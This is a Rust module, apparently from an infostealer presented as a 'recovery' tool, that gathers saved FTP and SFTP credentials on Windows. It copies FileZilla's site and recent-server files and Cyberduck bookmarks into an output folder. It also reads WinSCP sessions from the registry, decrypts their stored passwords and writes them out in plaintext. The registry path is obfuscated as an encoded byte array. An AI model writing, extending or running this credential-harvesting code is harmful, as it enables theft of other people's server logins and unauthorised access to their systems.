use crate::recovery::helpers::obfuscation::deobf;
use crate::recovery::{
    context::RecoveryContext,
    fs::sanitize_label,
    task::{RecoveryArtifact, RecoveryCategory, RecoveryError, RecoveryTask},
};
use async_trait::async_trait;
use roxmltree::{Document, Node};
use std::path::{Path, PathBuf};
use std::sync::Arc;
use tokio::fs;
use winreg::RegKey;
use winreg::enums::HKEY_CURRENT_USER;

pub fn ftp_tasks(_ctx: &RecoveryContext) -> Vec<Arc<dyn RecoveryTask>> {
    vec![
        Arc::new(CyberduckTask),
        Arc::new(FileZillaTask),
        Arc::new(WinSCPTask),
    ]
}

struct CyberduckTask;

#[async_trait]
impl RecoveryTask for CyberduckTask {
    fn label(&self) -> String {
        "Cyberduck Bookmarks".to_string()
    }

    fn category(&self) -> RecoveryCategory {
        RecoveryCategory::System
    }

    async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
        let source = ctx.roaming_data_dir.join("Cyberduck").join("bookmarks.xml");
        if !source.exists() {
            return Ok(Vec::new());
        }

        let label = self.label();
        let dest = ftp_output_dir(ctx, "Cyberduck").await?;
        fs::create_dir_all(&dest).await?;

        let bookmarks = dest.join("bookmarks.xml");
        fs::copy(&source, &bookmarks).await?;
        let mut artifacts = vec![artifact_for_path(&label, &bookmarks).await?];

        let contents = fs::read_to_string(&source).await?;
        let summary = parse_cyberduck_bookmarks(&contents)?;
        let summary_path = dest.join("Content.txt");
        fs::write(&summary_path, summary).await?;
        artifacts.push(artifact_for_path(&label, &summary_path).await?);

        Ok(artifacts)
    }
}

struct FileZillaTask;

#[async_trait]
impl RecoveryTask for FileZillaTask {
    fn label(&self) -> String {
        "FileZilla Configuration".to_string()
    }

    fn category(&self) -> RecoveryCategory {
        RecoveryCategory::System
    }

    async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
        let base = ctx.roaming_data_dir.join("FileZilla");
        let files = ["recentservers.xml", "sitemanager.xml"];
        let mut artifacts = Vec::new();
        let label = self.label();
        let dest = ftp_output_dir(ctx, "FileZilla").await?;

        for file in files {
            let source = base.join(file);
            if !source.exists() {
                continue;
            }

            fs::create_dir_all(&dest).await?;
            let destination = dest.join(file);
            fs::copy(&source, &destination).await?;
            artifacts.push(artifact_for_path(&label, &destination).await?);
        }

        Ok(artifacts)
    }
}

struct WinSCPTask;

#[async_trait]
impl RecoveryTask for WinSCPTask {
    fn label(&self) -> String {
        "WinSCP Sessions".to_string()
    }

    fn category(&self) -> RecoveryCategory {
        RecoveryCategory::System
    }

    async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
        let sessions = collect_winscp_sessions();
        if sessions.is_empty() {
            return Ok(Vec::new());
        }

        let label = self.label();
        let dest = ftp_output_dir(ctx, "WinSCP").await?;
        fs::create_dir_all(&dest).await?;
        let target = dest.join("Content.txt");

        let mut builder = String::new();
        builder.push_str("WinSCP Sessions\n\n");

        for session in sessions {
            builder.push_str(&format!("Session  : {}\n", session.name));
            builder.push_str(&format!(
                "Hostname : {}\n",
                session.hostname.as_deref().unwrap_or("Unknown")
            ));
            builder.push_str(&format!(
                "Username : {}\n",
                session.username.as_deref().unwrap_or("Unknown")
            ));
            builder.push_str(&format!("Password : {}\n\n", session.password));
        }

        fs::write(&target, builder).await?;
        Ok(vec![artifact_for_path(&label, &target).await?])
    }
}

async fn ftp_output_dir(ctx: &RecoveryContext, label: &str) -> Result<PathBuf, RecoveryError> {
    let folder = ctx
        .output_dir
        .join("services")
        .join("System")
        .join("FTP")
        .join(sanitize_label(label));
    fs::create_dir_all(&folder).await?;
    Ok(folder)
}

async fn artifact_for_path(label: &str, path: &Path) -> Result<RecoveryArtifact, RecoveryError> {
    let meta = fs::metadata(path).await?;
    Ok(RecoveryArtifact {
        label: label.to_string(),
        path: path.to_path_buf(),
        size_bytes: meta.len(),
        modified: meta.modified().ok(),
    })
}

fn parse_cyberduck_bookmarks(xml: &str) -> Result<String, RecoveryError> {
    let document = Document::parse(xml)
        .map_err(|err| RecoveryError::Custom(format!("cyberduck xml parse failed: {err}")))?;

    let mut builder = String::new();
    for bookmark in document
        .descendants()
        .filter(|node| node.has_tag_name("bookmark"))
    {
        builder.push_str("Bookmark:\n");
        builder.push_str(&format!(
            "Nickname : {}\n",
            child_text(&bookmark, "nickname")
        ));
        builder.push_str(&format!(
            "Protocol : {}\n",
            child_text(&bookmark, "protocol")
        ));
        builder.push_str(&format!("Server   : {}\n", child_text(&bookmark, "server")));
        builder.push_str(&format!("Port     : {}\n", child_text(&bookmark, "port")));
        builder.push_str(&format!(
            "Username : {}\n\n",
            child_text(&bookmark, "username")
        ));
    }

    Ok(builder)
}

fn child_text(parent: &Node, tag: &str) -> String {
    parent
        .children()
        .find(|child| child.has_tag_name(tag))
        .and_then(|child| child.text())
        .map(|value| {
            let trimmed = value.trim();
            if trimmed.is_empty() {
                "Unknown".to_string()
            } else {
                trimmed.to_string()
            }
        })
        .unwrap_or_else(|| "Unknown".to_string())
}

struct WinSCPSession {
    name: String,
    hostname: Option<String>,
    username: Option<String>,
    password: String,
}

fn collect_winscp_sessions() -> Vec<WinSCPSession> {
    // "SOFTWARE\\Martin Prikryl\\WinSCP 2\\Sessions"
    let winscp_reg_path = deobf(&[
        0x90, 0xAC, 0x85, 0x97, 0x94, 0x82, 0x91, 0x86, 0xE1, 0x81, 0xAF, 0x91, 0xD7, 0xD4, 0xCF,
        0xE1, 0x9D, 0x91, 0xD4, 0xDA, 0xDB, 0xC4, 0xD1, 0xE1, 0x94, 0xD4, 0xCF, 0x90, 0x80, 0x9D,
        0x93, 0xB1, 0xE1, 0x90, 0x86, 0x90, 0x90, 0xD4, 0xAC, 0xCE, 0xCF,
    ]);
    let mut sessions = Vec::new();

    if let Ok(root) = RegKey::predef(HKEY_CURRENT_USER).open_subkey(winscp_reg_path) {
        for sub in root.enum_keys().filter_map(Result::ok) {
            if let Ok(session_key) = root.open_subkey(&sub) {
                let hostname = session_key.get_value::<String, _>("HostName").ok();
                let username = session_key.get_value::<String, _>("UserName").ok();
                let password = session_key.get_value::<String, _>("Password").ok();
                let decrypted = password.as_deref().and_then(|value| {
                    decrypt_winscp_password(
                        hostname.as_deref().unwrap_or_default(),
                        username.as_deref().unwrap_or_default(),
                        value,
                    )
                });

                sessions.push(WinSCPSession {
                    name: sub.clone(),
                    hostname,
                    username,
                    password: decrypted.unwrap_or_else(|| "No password saved".to_string()),
                });
            }
        }
    }

    sessions
}

fn decrypt_winscp_password(hostname: &str, username: &str, encrypted: &str) -> Option<String> {
    const CHECK_FLAG: u8 = 255;
    const MAGIC: u8 = 163;

    fn decrypt_next_character(remaining: &str) -> Option<(u8, &str)> {
        let bytes = remaining.as_bytes();
        if bytes.len() < 2 {
            return None;
        }

        let first = hex_value(bytes[0])?;
        let second = hex_value(bytes[1])?;
        let added = first.wrapping_mul(16).wrapping_add(second);
        let decrypted = added ^ MAGIC;
        let result = decrypted.wrapping_add(1);
        Some((result, &remaining[2..]))
    }

    fn hex_value(byte: u8) -> Option<u8> {
        match byte {
            b'0'..=b'9' => Some(byte - b'0'),
            b'A'..=b'F' => Some(byte - b'A' + 10),
            b'a'..=b'f' => Some(byte - b'a' + 10),
            _ => None,
        }
    }

    let mut remaining = encrypted;
    let (mut flag, rest) = decrypt_next_character(remaining)?;
    remaining = rest;

    if flag == CHECK_FLAG {
        if remaining.len() < 2 {
            return None;
        }
        remaining = &remaining[2..];
        let (next_flag, next_rest) = decrypt_next_character(remaining)?;
        flag = next_flag;
        remaining = next_rest;
    }

    let len = flag as usize;
    let (_, rest) = decrypt_next_character(remaining)?;
    remaining = rest;

    let skip = len * 2;
    if remaining.len() < skip {
        return None;
    }
    remaining = &remaining[skip..];

    let mut final_output = String::new();
    let mut last_flag = 0u8;
    for _ in 0..len {
        let (char_code, next) = decrypt_next_character(remaining)?;
        last_flag = char_code;
        final_output.push(char_code as char);
        remaining = next;
    }

    if last_flag == CHECK_FLAG {
        let key_len = hostname.len() + username.len();
        if final_output.len() >= key_len {
            return Some(final_output[key_len..].to_string());
        }
        return Some(final_output);
    }

    Some(final_output)
}
